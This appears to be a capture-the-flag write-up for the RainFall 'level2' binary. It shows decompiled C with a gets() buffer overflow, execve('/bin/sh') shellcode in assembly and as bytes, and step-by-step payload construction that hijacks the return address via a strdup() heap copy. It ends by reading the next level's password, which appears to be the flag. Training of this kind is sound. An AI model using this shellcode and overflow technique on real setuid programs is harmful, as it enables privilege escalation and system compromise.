@@ -1,0 +1,110 @@
+
+```bash
+$ ls -la
+-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
+
+$ file level2
+level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
+```
+
+Reversed in c:
+```c
+char *p(void)
+{
+    char s[64];
+    const void *v2;
+    unsigned int retaddr;
+
+    fflush(stdout);
+    gets(s);
+    v2 = (const void *)retaddr;
+    if ( (retaddr & 0xb0000000) == 0xb0000000 )
+    {
+        printf("(%p)\n", v2);
+        exit(1);
+    }
+    puts(s);
+    return strdup(s);
+}
+
+int main(void)
+{
+    return p();
+}
+```
+
+The stack of the `p()` fonction is of the size 104
+the start of s[64] is at `ebp - 76`, so we have 12(76-64) character of buffer overflow 8 for v2* and 4 for retaddr
+There is a check with `retaddr`, this check if `retaddr` is a stack varaible
+The decompilation here is a bit missleading because we see a stack variable retaddr, but this in fact the real retaddr of the function
+This maybe protect the `p()` function call but not `main()`, we can also use the heap because of the `strdup()` at the end.
+
+First we gonna write a shell code to open `execve()`:
+```asm
+0:  31 c0                   xor    eax,eax      ; eax = 0
+2:  31 d2                   xor    edx,edx      ; edx == 0 (envp = NULL)
+4:  50                      push   eax          ; push 0 (NULL)  -- terminator for argv/envp
+5:  68 2f 2f 73 68          push   0x68732f2f   ; push "//sh"
+a:  68 2f 62 69 6e          push   0x6e69622f   ; push "/bin"
+f:  89 e3                   mov    ebx,esp      ; ebx -> "/bin//sh" (filename)
+11: 50                      push   eax          ; push NULL (argv terminator)
+12: 53                      push   ebx          ; push pointer to filename
+13: 89 e1                   mov    ecx,esp      ; ecx -> argv (pointer to array [filename, NULL])
+15: b0 0b                   mov    al,0xb       ; syscall number 11 = execve
+17: cd 80                   int    0x80         ; invoke kernel
+```   
+
+We can use so website (https://defuse.ca/online-x86-assembler.htm#disassembly) or compiler to get the shell code in a full string:
+"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+
+We gonna inject the shell code in the stack:
+```bash
+rm -f /tmp/payload_2
+echo -ne "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" > /tmp/payload_2 # the shell code
+printf 'A%.0s' {1..51} >> /tmp/payload_2 # garbage
+echo -ne "\x28\xf7\xff\xbf" >> /tmp/payload_2 # we use the main stack value
+echo -ne "\x4a\x85\x04\x08" >> /tmp/payload_2 # we use the main return value
+printf 'A%.0s' {1..8} >> /tmp/payload_2 # we skill the stack frame of main()
+echo -ne "\x00\x00\x00\x00" >> /tmp/payload_2 # we don't really care about this value too
+echo -ne "\xcc\xf6\xff\xbf" >> /tmp/payload_2 # The jump value we gonna use to run the shell code (0xbffff6cc)
+```
+
+We run it:
+```bash
+level2@RainFall:~$ cat /tmp/payload_2 - | ./level2 
+
+1�1�Ph//shh/bin��PS��
+                     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAA(���JAAAAAAAA
+
+Segmentation fault (core dumped)
+```
+
+Look like the stack don't like what i'm doing, lest check what gdb say:
+```bash
+(gdb) run params ... < /tmp/payload_2
+Starting program: /home/user/level2/level2 params ... < /tmp/payload_2
+1�1�Ph//shh/bin��PS��
+                     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAA(���JAAAAAAAA
+process 18037 is executing new program: /bin/dash
+[Inferior 1 (process 18037) exited normally]
+```
+
+Look like we can't use the stack to run the shell code whiout gdb helping us
+
+Let's inject the shell code in the heap then:
+```bash
+rm -f /tmp/payload_2
+echo -ne "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" > /tmp/payload_2 # the shell code
+printf 'A%.0s' {1..55} >> /tmp/payload_2 # garbage
+echo -ne "\x08\xa0\x04\x08" >> /tmp/payload_2 # we jump on the strdup() return value
+```
+
+And run it:
+```bash
+level2@RainFall:~$ cat /tmp/payload_2 - | ./level2
+
+1�1�Ph//shh/bin��PS��
+                     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat /home/user/level3/.pass
+> cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
